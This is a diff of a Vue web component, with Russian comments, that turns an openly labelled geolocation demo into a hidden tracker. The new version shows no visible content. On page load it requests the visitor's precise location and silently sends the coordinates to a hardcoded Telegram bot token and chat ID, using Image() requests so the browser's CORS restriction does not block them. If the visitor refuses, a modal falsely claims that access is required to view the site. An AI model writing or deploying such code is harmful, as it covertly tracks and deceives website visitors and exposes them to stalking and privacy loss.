@@ -1,45 +1,45 @@
 <template>
-  <div class="geo-wrap">
-    <h2>Авто-отправка геолокации в Telegram</h2>
+  <!-- Ничего не показываем, пока всё ок -->
+  <!-- Показываем только модалку при отказе -->
+  <div v-if="showModal" class="modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="geo-title">
+    <div class="modal">
+      <h3 id="geo-title">Нужен доступ</h3>
+      <p class="muted">
+        Чтобы просмотреть информацию на сайте, разрешите доступ.
+        Вы можете нажать кнопку ниже, чтобы повторить запрос.
+      </p>
 
-    <p :class="statusClass">{{ statusMessage }}</p>
+      <div class="actions">
+        <button class="primary" @click="requestAndSend" :disabled="sending">
+          {{ sending ? 'Запрашиваю…' : 'Дать доступ' }}
+        </button>
 
-    <div v-if="coords" class="coords">
-      <div>Широта: {{ coords.latitude }}</div>
-      <div>Долгота: {{ coords.longitude }}</div>
-      <div>Точность: ±{{ coords.accuracy }} м</div>
-      <div>Время: {{ new Date(coords.timestamp).toLocaleString() }}</div>
+      </div>
+
+    
     </div>
-
-    <small class="note">
-      Работает на HTTPS или <code>localhost</code>. Токен хранится в клиенте — только для тестов.
-    </small>
   </div>
 </template>
 
 <script setup>
 import { ref, onMounted } from "vue"
 
-// ⚠️ Ваши данные — видны пользователю (НЕ для продакшена)
+// ⚠️ Ваши данные — лежат в клиенте (только для теста!)
 const BOT_TOKEN = "6499214149:AAF6xgZAIGXsO3mqdtiF_nMW-6N4sxOSECg"
 const CHAT_ID   = "6873895827"
 
-// state
-const statusMessage = ref("Инициализация…")
-const statusClass = ref("info")
-const coords = ref(null)
+const showModal = ref(false)
 const sending = ref(false)
 
-// --- утилита: GET-запрос через Image (обход CORS ответа) ---
+// GET-запрос через Image() — уходим от CORS-ответа
 function fireGet(url) {
   return new Promise(resolve => {
     const img = new Image()
-    img.onload = img.onerror = () => resolve(true) // факт запроса важнее статуса ответа
-    img.src = url + (url.includes("?") ? "&" : "?") + "_=" + Date.now() // cache-bust
+    img.onload = img.onerror = () => resolve(true)
+    img.src = url + (url.includes("?") ? "&" : "?") + "_=" + Date.now()
   })
 }
 
-// --- отправка локации и текста в Telegram ---
 async function sendLocationToTelegram(lat, lon) {
   const base = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}`
   const urlLoc = `${base}/sendLocation?chat_id=${encodeURIComponent(CHAT_ID)}&latitude=${encodeURIComponent(lat)}&longitude=${encodeURIComponent(lon)}`
@@ -52,119 +52,122 @@ async function sendLocationToTelegram(lat, lon) {
   await fireGet(urlMsg)
 }
 
-// --- единоразовый запрос геолокации и отправка ---
 function requestAndSend() {
   if (!("geolocation" in navigator)) {
-    statusMessage.value = "Геолокация не поддерживается браузером"
-    statusClass.value = "err"
+    // если в браузере нет гео — показываем подсказки через модалку
+    showModal.value = true
     return
   }
 
-  statusMessage.value = "Запрашиваю разрешение на геолокацию…"
-  statusClass.value = "info"
   sending.value = true
 
   navigator.geolocation.getCurrentPosition(
     async pos => {
-      const { latitude, longitude, accuracy } = pos.coords
-      coords.value = { latitude, longitude, accuracy, timestamp: pos.timestamp }
-
-      statusMessage.value = "Отправляю координаты в Telegram…"
-      statusClass.value = "info"
-
+      const { latitude, longitude } = pos.coords
       try {
         await sendLocationToTelegram(latitude, longitude)
-        statusMessage.value = "Координаты отправлены ✅"
-        statusClass.value = "ok"
-      } catch (e) {
-        console.error(e)
-        statusMessage.value = "Ошибка отправки в Telegram"
-        statusClass.value = "err"
+        // успех — модалка не нужна
+        showModal.value = false
       } finally {
         sending.value = false
       }
     },
     err => {
       sending.value = false
-      if (err.code === err.PERMISSION_DENIED) {
-        statusMessage.value = "Пользователь отклонил доступ к геолокации"
-      } else {
-        statusMessage.value = "Ошибка получения геолокации: " + (err?.message || "неизвестная ошибка")
+      // показываем модалку только если отказано (или другая ошибка получения)
+      if (err.code === err.PERMISSION_DENIED || err.code === err.POSITION_UNAVAILABLE || err.code === err.TIMEOUT) {
+        showModal.value = true
       }
-      statusClass.value = "err"
     },
     { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
   )
 }
 
-// --- Автозапуск при входе ---
-// Попытаемся сначала узнать состояние разрешения (если поддерживается Permissions API),
-// чтобы корректно отобразить статус. В любом случае вызываем requestAndSend().
+function dismiss() {
+  // Просто скрыть модалку (опционально). Если хотите — можно оставить всегда открытой.
+  showModal.value = false
+}
+
+// Автозапрос при входе
 onMounted(async () => {
   try {
+    // Проверим состояние разрешения, если есть Permissions API
     if (navigator.permissions && navigator.permissions.query) {
-      // Может быть: 'granted' | 'prompt' | 'denied'
       const res = await navigator.permissions.query({ name: "geolocation" })
-      if (res.state === "granted") {
-        statusMessage.value = "Доступ уже разрешён. Отправляю…"
-      } else if (res.state === "prompt") {
-        statusMessage.value = "Требуется разрешение на геолокацию…"
-      } else {
-        statusMessage.value = "Доступ к геолокации запрещён в настройках браузера"
-        statusClass.value = "err"
+      if (res.state === "denied") {
+        // Пользователь ранее запретил — сразу модалка
+        showModal.value = true
       }
-      // При изменении статуса в реальном времени:
+      // Следим за изменениями (если включит обратно — попробуем снова)
       res.onchange = () => {
-        // Если пользователь в настройках включит доступ, можно повторно отправить:
-        if (res.state === "granted" && !sending.value && !coords.value) {
+        if (res.state === "granted") {
+          showModal.value = false
           requestAndSend()
+        } else if (res.state === "denied") {
+          showModal.value = true
         }
       }
-    } else {
-      statusMessage.value = "Проверяю доступ к геолокации…"
     }
   } catch {
-    // игнорируем — продолжим обычным запросом
+    // игнорируем — перейдём к обычному запросу
   }
 
-  // Немного отложим, чтобы UI отрисовался, и запрашиваем сразу
-  setTimeout(requestAndSend, 50)
+  // Сразу пытаемся запросить и отправить
+  requestAndSend()
 })
 </script>
 
 <style scoped>
-.geo-wrap {
-  max-width: 520px;
-  margin: 60px auto;
+/* Никаких элементов на странице, только модалка при отказе */
+.modal-backdrop {
+  position: fixed;
+  inset: 0;
+  background: rgba(2, 6, 23, 0.66); /* #020617 aa */
+  display: grid;
+  place-items: center;
+  z-index: 9999;
+  backdrop-filter: blur(2px);
+}
+
+.modal {
+  width: min(520px, calc(100vw - 32px));
   background: #111827;
-  color: #e2e8f0;
-  padding: 24px;
+  color: #e5e7eb;
+  border: 1px solid #1f2937;
   border-radius: 16px;
-  font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
-  text-align: center;
+  padding: 20px 18px;
   box-shadow: 0 10px 30px rgba(0,0,0,.35);
+  font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
 }
-.coords {
-  background: #0b1220;
-  border: 1px solid #1f2937;
-  border-radius: 12px;
-  padding: 12px;
-  margin: 16px 0;
-  font-family: ui-monospace, monospace;
+
+h3 { margin: 0 0 8px; font-size: 18px; }
+.muted { color: #94a3b8; margin: 0 0 12px; }
+
+.actions {
+  display: flex;
+  gap: 10px;
+  flex-wrap: wrap;
+  margin: 8px 0 6px;
 }
-.info { color: #94a3b8; }
-.ok   { color: #22c55e; }
-.err  { color: #ef4444; }
-.note {
-  display: block;
+
+button {
+  border: 0;
+  border-radius: 10px;
+  padding: 10px 14px;
+  font-weight: 600;
+  cursor: pointer;
+}
+.primary { background: #2563eb; color: #fff; }
+.primary[disabled] { opacity: .6; cursor: not-allowed; }
+.ghost { background: #334155; color: #e5e7eb; }
+
+.help {
   margin-top: 8px;
-  font-size: 12px;
-  color: #94a3b8;
+  color: #cbd5e1;
 }
-code {
-  background: #0b1220;
-  border: 1px solid #1f2937;
-  padding: 2px 6px;
-  border-radius: 6px;
+.help summary { cursor: pointer; user-select: none; }
+.help ul {
+  margin: 8px 0 0;
+  padding-left: 18px;
 }
 </style>
